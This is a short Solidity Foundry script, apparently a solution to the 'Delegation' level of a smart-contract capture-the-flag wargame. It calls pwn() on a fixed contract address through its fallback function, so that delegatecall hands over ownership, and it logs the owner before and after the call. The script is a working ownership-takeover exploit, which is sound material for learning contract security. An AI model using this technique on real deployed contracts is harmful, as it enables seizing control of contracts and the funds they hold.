// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level6.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level6sol is Script{

    Delegation public level6 = Delegation(0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7);

    function run()  external{

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Initial Owner : ", level6.owner());
        
        address(level6).call(abi.encodeWithSignature("pwn()"));

        console.log("Final Owner : ", level6.owner());
        vm.stopBroadcast();

    }

}